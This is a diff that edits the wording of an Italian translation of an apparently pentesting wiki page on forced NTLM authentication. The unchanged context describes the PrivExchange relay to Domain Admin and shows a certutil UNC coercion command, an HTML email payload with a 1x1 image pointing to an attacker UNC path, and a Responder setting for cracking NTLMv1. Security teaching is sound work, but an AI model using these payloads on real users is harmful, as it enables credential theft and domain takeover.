@@ -53,7 +53,7 @@ https://github.com/p0dalirius/Coercer
 
 L'attacco `PrivExchange` è il risultato di un difetto trovato nella **funzione `PushSubscription` di Exchange Server**. Questa funzione consente al server Exchange di essere forzato da qualsiasi utente di dominio con una casella di posta ad autenticarsi su qualsiasi host fornito dal client tramite HTTP.
 
-Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sull'aggiornamento cumulativo del dominio pre-2019**). Questo difetto può essere sfruttato per abilitare il **reindirizzamento delle informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il reindirizzamento a LDAP non sia possibile, questo difetto può comunque essere utilizzato per reindirizzare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
+Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sull'aggiornamento cumulativo del dominio pre-2019**). Questo difetto può essere sfruttato per abilitare il **inoltro di informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui l'inoltro a LDAP non sia possibile, questo difetto può comunque essere utilizzato per inoltrare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.
 
 ## All'interno di Windows
 
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Via email
 
-Se conosci l'**indirizzo email** dell'utente che accede a una macchina che desideri compromettere, potresti semplicemente inviargli un **email con un'immagine 1x1** come
+Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, puoi semplicemente inviargli un **email con un'immagine 1x1** come
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -104,7 +104,7 @@ Se puoi eseguire un attacco MitM a un computer e iniettare HTML in una pagina ch
 ```
 ## Cracking NTLMv1
 
-Se riesci a catturare [le sfide NTLMv1 leggi qui come crackerle](../ntlm/index.html#ntlmv1-attack).\
-_&#x52;emember che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
+Se riesci a catturare [NTLMv1 challenges leggi qui come crackerli](../ntlm/index.html#ntlmv1-attack).\
+_Ricorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
